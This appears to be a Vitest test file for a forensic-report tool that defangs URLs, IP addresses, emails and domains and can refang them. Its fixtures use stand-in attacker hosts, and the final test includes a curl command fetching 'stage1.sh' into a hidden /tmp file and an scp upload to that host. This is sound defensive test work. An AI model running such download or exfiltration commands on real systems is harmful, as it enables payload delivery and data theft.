import { describe, it, expect } from "vitest";
import { defangIndicators } from "../../src/reports/defang.js";
import { refangIocValue } from "../../src/analysis/iocValue.js";

describe("defangIndicators", () => {
  it("defangs the scheme and host of a URL", () => {
    expect(defangIndicators("see http://evil.example/stage1.sh for details")).toBe(
      "see hxxp://evil[.]example/stage1.sh for details",
    );
    expect(defangIndicators("https://a.b.co.uk/x")).toBe("hxxps://a[.]b[.]co[.]uk/x");
  });

  it("leaves the path, query and fragment of a URL untouched", () => {
    // Mirrors iocValue.authorityEnd: only the part a click acts on is neutralised. Rewriting the
    // path would change a string that correlation and retrieval depend on matching exactly.
    expect(defangIndicators("http://host.example/a.b/c?q=x.y#z.w")).toBe(
      "hxxp://host[.]example/a.b/c?q=x.y#z.w",
    );
  });

  it("defangs a bare IPv4 address", () => {
    expect(defangIndicators("beacon to 203.0.113.10 observed")).toBe("beacon to 203[.]0[.]113[.]10 observed");
  });

  it("defangs an IPv4 host inside a URL exactly once", () => {
    expect(defangIndicators("http://203.0.113.10/stage1.sh")).toBe("hxxp://203[.]0[.]113[.]10/stage1.sh");
  });

  it("defangs an email address", () => {
    expect(defangIndicators("from root@203.0.113.10 and a@b.example")).toBe(
      "from root[@]203[.]0[.]113[.]10 and a[@]b[.]example",
    );
  });

  it("always defangs a www host, which GFM autolinks on sight", () => {
    expect(defangIndicators("beaconing to www.evil.com daily")).toBe("beaconing to www[.]evil[.]com daily");
  });

  it("defangs a bare hostname the case records as a domain IOC", () => {
    expect(defangIndicators("callback to evil.test observed", ["evil.test"])).toBe(
      "callback to evil[.]test observed",
    );
  });

  it("does not guess at dotted tokens the case never called domains", () => {
    // A forensic report is full of filenames shaped exactly like a domain with a two-letter TLD.
    // Mangling them in a deliverable costs more than leaving an inert, unlinked hostname fanged.
    const text = "System.Net.WebClient wrote vitest.config.ts and History.db to disk";
    expect(defangIndicators(text)).toBe(text);
  });

  it("leaves ordinary prose, filenames and version strings alone", () => {
    const prose = "Version 0.36.0 wrote report.md and report.html at 10.5 MB/s.";
    expect(defangIndicators(prose)).toBe(prose);
  });

  it("is idempotent — already-defanged text is not defanged again", () => {
    const once = defangIndicators("http://evil.example/x and 203.0.113.10");
    expect(defangIndicators(once)).toBe(once);
  });

  it("round-trips back to the live indicator via refangIocValue", () => {
    // Defanging is a presentation of the indicator, not a different one. An analyst who copies a
    // value out of the report must be able to get the real one back.
    expect(refangIocValue("url", defangIndicators("http://evil.example/x"))).toBe("http://evil.example/x");
    expect(refangIocValue("ip", defangIndicators("203.0.113.10"))).toBe("203.0.113.10");
  });

  it("defangs every indicator in a multi-line report body", () => {
    const body = [
      "| i001 | url | http://203.0.113.10/stage1.sh |",
      "curl -s http://203.0.113.10/stage1.sh -o /tmp/.x",
      "scp file user@203.0.113.10:/tmp/",
    ].join("\n");
    const out = defangIndicators(body);
    expect(out).not.toMatch(/http:\/\//);
    expect(out.match(/hxxp:\/\//g)).toHaveLength(2);
    expect(out).toContain("user[@]203[.]0[.]113[.]10");
  });
});
